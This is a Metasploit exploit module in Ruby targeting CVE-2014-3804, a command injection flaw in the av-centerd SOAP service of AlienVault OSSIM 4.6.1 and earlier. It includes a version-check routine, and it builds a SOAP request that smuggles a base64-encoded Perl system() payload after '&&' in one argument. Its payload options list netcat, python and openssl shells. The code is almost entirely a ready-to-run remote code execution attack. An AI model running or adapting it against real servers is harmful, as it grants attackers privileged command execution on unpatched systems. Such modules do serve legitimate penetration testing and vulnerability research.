# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rexml/document&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include REXML

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;AlienVault OSSIM av-centerd Command Injection&#039;,
      &#039;Description&#039;   => %q{
        This module exploits a code execution flaw in AlienVault 4.6.1 and
        prior.  The vulnerability exists in the av-centerd SOAP web service,
        where the update_system_info_debian_package method uses perl backticks
        in an insecure way, allowing command injection. This module has been
        tested successfully on AlienVault 4.6.0.
      },
      &#039;Author&#039;        =>
        [
          &#039;Unknown&#039;, # From HP ZDI team, Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;       => MSF_LICENSE,
      &#039;References&#039;    =>
        [
          [&#039;CVE&#039;, &#039;2014-3804&#039;],
          [&#039;BID&#039;, &#039;67999&#039;],
          [&#039;ZDI&#039;, &#039;14-202&#039;],
          [&#039;URL&#039;, &#039;http://forums.alienvault.com/discussion/2690&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          #&#039;BadChars&#039;   => "[;`$<>|]", # Don&#039;t apply bcuz of the perl stub applied
          &#039;Compat&#039;      => {
            &#039;RequiredCmd&#039; => &#039;perl netcat-e openssl python gawk&#039;
          }
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;AlienVault <= 4.6.1&#039;, { }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;May 5 2014&#039;))

    register_options(
      [
        Opt::RPORT(40007)
      ], self.class)
  end

  def check
    version = ""
    res = send_soap_request("get_dpkg")

    if res &&
       res.code == 200 &&
       res.headers[&#039;SOAPServer&#039;] &&
       res.headers[&#039;SOAPServer&#039;] =~ /SOAP::Lite/ &&
       res.body.to_s =~ /alienvault-center\s*([\d\.]*)-\d/

      version = $1
    end

    if version.empty? || version >= "4.7.0"
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Appears
    end
  end

  def exploit
    send_soap_request("update_system_info_debian_package", 1)
  end

  def build_soap_request(method)
    xml = Document.new
    xml.add_element(
      "soap:Envelope",
      {
        &#039;xmlns:xsi&#039;          => "http://www.w3.org/2001/XMLSchema-instance",
        &#039;xmlns:soapenc&#039;      => "http://schemas.xmlsoap.org/soap/encoding/",
        &#039;xmlns:xsd&#039;          => "http://www.w3.org/2001/XMLSchema",
        &#039;soap:encodingStyle&#039; => "http://schemas.xmlsoap.org/soap/encoding/",
        &#039;xmlns:soap&#039;         => "http://schemas.xmlsoap.org/soap/envelope/"
      })
    body = xml.root.add_element("soap:Body")
    m = body.add_element(
      method,
      {
        &#039;xmlns&#039; => "AV/CC/Util"
      })
    args = []
    args[0] = m.add_element("c-gensym3", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
    args[1] = m.add_element("c-gensym5", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
    args[2] = m.add_element("c-gensym7", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
    args[3] = m.add_element("c-gensym9", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
    (0..3).each { |i| args[i].text = rand_text_alpha(4 + rand(4)) }

    if method == "update_system_info_debian_package"
      args[4] = m.add_element("c-gensym11", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
      perl_payload  = "system(decode_base64"
      perl_payload += "(\"#{Rex::Text.encode_base64(payload.encoded)}\"))"
      args[4].text  = "#{rand_text_alpha(4 + rand(4))}"
      args[4].text += " && perl -MMIME::Base64 -e &#039;#{perl_payload}&#039;"
    end

    xml.to_s
  end

  def send_soap_request(method, timeout = 20)
    soap = build_soap_request(method)

    res = send_request_cgi({
      &#039;uri&#039;      => &#039;/av-centerd&#039;,
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;ctype&#039;    => &#039;text/xml; charset=UTF-8&#039;,
      &#039;data&#039;     => soap,
      &#039;headers&#039;  => {
        &#039;SOAPAction&#039; => "\"AV/CC/Util##{method}\""
      }
    }, timeout)

    res
  end

end

